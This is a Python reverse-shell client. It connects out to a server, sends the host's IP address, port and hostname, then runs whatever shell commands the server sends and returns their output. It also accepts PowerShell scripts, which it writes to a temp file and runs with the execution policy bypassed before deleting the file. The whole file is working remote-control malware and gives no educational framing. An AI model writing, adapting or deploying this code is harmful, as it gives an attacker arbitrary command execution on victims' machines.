import socket
import subprocess
import sys
import os
import tempfile

client_socket = None

def create_socket():
    global client_socket
    try:
        client_socket = socket.socket()
    except socket.error as e:
        sys.exit(f"Socket creation error: {str(e)}")

def connect_to_server():
    global client_socket
    host = '127.0.0.1'
    port = 8081

    try:
        client_socket.connect((host, port))
        client_ip = client_socket.getsockname()[0]
        client_port = client_socket.getsockname()[1]
        hostname = socket.gethostname()
        flags = f"IP_ADDRESS**{client_ip}**PORT_NUMBER**{client_port}**HOSTNAME**{hostname}"
        client_socket.send(flags.encode())
    except socket.error as e:
        sys.exit(f"Connection to server failed: {str(e)}")

def execute_script(script_lines):
    with tempfile.NamedTemporaryFile(delete=False, suffix=".ps1", mode="w", dir=os.getenv("TEMP")) as temp_script:
        temp_script.writelines(script_lines)
    try:
        subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", temp_script.name], check=True)
        return b"Script executed successfully."
    except subprocess.CalledProcessError as e:
        return f"Script execution failed: {str(e)}".encode()
    finally:
        if os.path.exists(temp_script.name):
            os.remove(temp_script.name)

def receive_commands():
    global client_socket
    while True:
        try:
            data = client_socket.recv(4096)
            if not data:
                print("Server closed the connection.")
                break
            decoded_data = data.decode("utf-8").strip()
            if decoded_data in ["EXIT", "EXIT_SERVER", "q", "e", "quit"]:
                print("Exit command received.")
                break
            if decoded_data.startswith("EXIT_CLIENT"):
                print(f"Disconnected from the server.")
                break
            elif decoded_data == "SCRIPT_START":
                script_lines = []
                while True:
                    line = client_socket.recv(4096)
                    if not line:
                        break
                    script_line = line.decode()
                    if "SCRIPT_END" in script_line:
                        script_lines.append(script_line.replace("SCRIPT_END", "").strip())
                        break
                    script_lines.append(script_line)
                response = execute_script(script_lines)
                client_socket.send(response)
            else:
                cmd = subprocess.Popen(decoded_data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output_bytes, error_bytes = cmd.communicate()
                output_str = output_bytes.decode("utf-8") + error_bytes.decode("utf-8")
                if output_str:
                    client_socket.send(output_str.encode())
                else:
                    client_socket.send(b"No output. The command may have opened an application.")
        except Exception as e:
            print(f"Error: {str(e)}")
            break
    if client_socket:
        client_socket.close()

def main():
    create_socket()
    connect_to_server()
    receive_commands()

if __name__ == "__main__":
    main()